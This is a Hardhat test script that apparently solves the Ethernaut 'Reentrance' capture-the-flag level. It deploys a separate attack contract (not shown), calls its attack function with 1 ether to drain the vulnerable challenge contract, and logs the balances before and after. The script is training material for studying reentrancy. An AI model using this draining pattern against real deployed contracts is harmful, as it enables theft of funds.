import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Reentrance", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`Reentrance`);
        const challengeAddress = await createChallenge(
            `0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb`, ethers.utils.parseEther("10.0")
        );
        challenge = await challengeFactory.attach(challengeAddress);

        const attackerFactory = await ethers.getContractFactory(`ReentranceAttack`);
        attacker = await attackerFactory.deploy(challenge.address);

        return { eoa, challenge, attacker };
    }

    it("solves the challenge", async function () {
        const { eoa, challenge, attacker } = await loadFixture(deployTokenFixture);

        try {
            console.log("target balance before", await ethers.provider.getBalance(challenge.address));
            const tx = await attacker.attack({value : ethers.utils.parseEther("1.0")});
            const receipt = await tx.wait();
            // console.log({receipt});
            console.log("target balance after", await ethers.provider.getBalance(challenge.address));
        } catch (err) {
            console.log("error: " + err);
        }


    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
